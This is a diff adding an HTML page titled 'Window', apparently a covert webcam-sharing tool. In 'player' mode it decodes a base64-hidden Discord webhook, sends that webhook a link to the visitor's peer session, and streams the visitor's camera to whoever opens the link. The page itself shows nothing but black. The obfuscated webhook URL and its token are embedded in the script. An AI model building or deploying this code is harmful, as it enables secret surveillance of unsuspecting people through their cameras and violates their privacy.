@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Window</title>
+    <style>
+      body {
+        margin: 0;
+        background-color: black;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        color: white;
+        font-family: Arial, sans-serif;
+      }
+
+      video {
+        width: 90vw;
+        height: 90vh;
+        object-fit: cover;
+        margin: 0;
+        border-radius: 10px;
+        box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+      }
+
+      .message {
+        text-align: center;
+        color: white;
+        font-size: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <script>
+      const params = new URLSearchParams(location.search);
+      const mode = params.get("mode");
+      const id = params.get("id");
+
+      const decodedWebhookURL = atob(
+        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NTI4MTU5MjMzMDk0ODYyOC9kbjl0Si1TTXdYYXdJVTNMeWtQc1ZtS2ZRQ3o5YloxSjRyei1ZYno2MGcyWFFMQXVPV3J0dE5oQWJFcTNxMDV0dGV6bw"
+      );
+
+      if (mode === "player") {
+        const peer = new Peer();
+
+        peer.on("open", (pid) => {
+          const embedData = {
+            embeds: [
+              {
+                title: "New Player Connected",
+                description: `Player ID: \`${pid}\` has connected.`,
+                color: 3447003,
+                fields: [
+                  {
+                    name: "Host Link",
+                    value: `${location.origin}${location.pathname}?mode=host&id=${pid}`,
+                    inline: false,
+                  },
+                ],
+                footer: {
+                  text: "Cam Share",
+                },
+                timestamp: new Date(),
+              },
+            ],
+          };
+
+          fetch(decodedWebhookURL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(embedData),
+          });
+
+          navigator.mediaDevices
+            .getUserMedia({
+              video: {
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+              },
+              audio: false,
+            })
+            .then((stream) => {
+              peer.on("call", (call) => {
+                call.answer(stream);
+              });
+            })
+            .catch((err) => {
+              console.error("Camera access failed:", err);
+            });
+        });
+
+        peer.on("error", (err) => console.error("Peer error:", err));
+      } else if (mode === "host" && id) {
+        const peer = new Peer();
+
+        document.body.innerHTML =
+          "<div class='message'>Connecting to Player...</div>";
+
+        peer.on("open", () => {
+          navigator.mediaDevices
+            .getUserMedia({
+              video: {
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+              },
+              audio: false,
+            })
+            .then((dummyStream) => {
+              const call = peer.call(id, dummyStream);
+              call.on("stream", (remoteStream) => {
+                document.body.innerHTML = "";
+                const video = document.createElement("video");
+                video.srcObject = remoteStream;
+                video.autoplay = true;
+                video.playsInline = true;
+                document.body.appendChild(video);
+              });
+            })
+            .catch((err) => {
+              console.error("Dummy stream error:", err);
+            });
+        });
+
+        peer.on("error", (err) => console.error("Peer error:", err));
+      } else {
+        document.body.innerHTML = `
+          <div class='message'>
+            <h2>How to Use</h2>
+            <p><strong>Player:</strong> <code>?mode=player</code></p>
+            <p><strong>Host:</strong> <code>?mode=host&id=PLAYER_ID</code></p>
+          </div>
+        `;
+      }
+    </script>
+  </body>
+</html>
